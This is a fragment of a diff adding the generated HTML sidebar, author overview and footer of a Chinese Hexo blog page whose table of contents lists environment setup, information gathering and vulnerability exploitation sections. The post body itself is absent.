+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">程序元</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程序元</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">420k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:22</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
